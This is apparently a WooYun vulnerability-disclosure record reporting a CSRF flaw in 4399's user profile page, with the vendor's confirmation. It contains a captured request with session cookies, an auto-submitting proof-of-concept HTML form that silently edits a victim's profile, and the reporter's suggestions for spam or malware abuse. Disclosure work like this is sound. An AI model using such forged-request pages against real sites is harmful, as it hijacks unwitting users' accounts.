{"id": 26806, "wybug_id": "wooyun-2015-0127638", "wybug_title": "4399小游戏CSRF漏洞可修改用户个人信息", "wybug_corp": "4399小游戏", "wybug_author": "黑翼、", "wybug_date": "2015-07-20 15:02", "wybug_open_date": "2015-09-03 16:26", "wybug_type": "CSRF", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-20：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向公众公开  简要描述： 4399小游戏CSRF漏洞可修改用户个人信息 详细说明：  登录-个人中心http://u.4399.com/user/info修改我的信息-抓包\nPOST /user/info/modify HTTP/1.1Host: u.4399.comProxy-Connection: keep-aliveContent-Length: 143Cache-Control: max-age=0Accept: text/html,application/xhtml xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://u.4399.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Content-Type: application/x-www-form-urlencodedDNT: 1Referer: http://u.4399.com/user/info/modifyAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie: home4399=yes; USESSIONID=3f2bf9ec-bd89-4267-9c73-ac9a6c7a3f8b; ck_accname=1732343001; Puser=1732343001; Xauth=321dded1475d4658e6043b8f51783962; ptusertype=www_home.qq_login; Pnick=.ryga; Qnick=                       .; UC_sessionid=2015071905062098f13b01eb; Pauth=272418833|1732343001|t3ce7n18297df281f2db9a683eb29e7c|1437253627|10007|f230d9253ef40d6758bbebcd007794e7|0; Uauth=ext|                       .|2015719|www_home.#pay.|1437253627842|617983aa84e7438869ca16b865c414a4; _gprp_c=; Hm_lvt_e79fe6d54b06996ff433165b66607ec5=1437253581; Hm_lpvt_e79fe6d54b06996ff433165b66607ec5=1437254247dosubmit=true&nick=wooyun.org&sex=1&bir_year=0&bir_month=0&bir_day=0&local_province=&local_city=&qq=&phone=&origo_province=&origo_city=&school=\n可以看到木有token之类的验证,来试下可不可以实施csrf攻击\n<html>  <!-- o(∩_∩)o  -->  <body>    <form action=\"http://u.4399.com/user/info/modify\" method=\"POST\">      <input type=\"hidden\" name=\"dosubmit\" value=\"true\" />      <input type=\"hidden\" name=\"nick\" value=\"wooyun666\" />      <input type=\"hidden\" name=\"sex\" value=\"1\" />      <input type=\"hidden\" name=\"bir_year\" value=\"0\" />      <input type=\"hidden\" name=\"bir_month\" value=\"0\" />      <input type=\"hidden\" name=\"bir_day\" value=\"0\" />      <input type=\"hidden\" name=\"local_province\" value=\"\" />      <input type=\"hidden\" name=\"local_city\" value=\"\" />      <input type=\"hidden\" name=\"qq\" value=\"\" />      <input type=\"hidden\" name=\"phone\" value=\"\" />      <input type=\"hidden\" name=\"origo_province\" value=\"\" />      <input type=\"hidden\" name=\"origo_city\" value=\"\" />      <input type=\"hidden\" name=\"school\" value=\"\" />      <input type=\"submit\" value=\"Submit request\" />    </form>  </body>  <script>document.forms[0].submit();</script></html>\n打开测试   漏洞证明：  \n\n成功修改,其他信息也是可以修改的.如果用发信息或者发帖子之类的来诱惑用户点击,然后把用户名改成网址qq之类的来营销,挂马之类的,危害还是挺大的.csrf是苏醒的巨人嘛o(∩_∩)o    修复方案：  你们更专业   版权声明：转载请注明来源 黑翼、@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：2  确认时间：2015-07-20 16:25 厂商回复： 谢谢你的关注，该情况已经交由相关部门处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 2, "Ranks": null}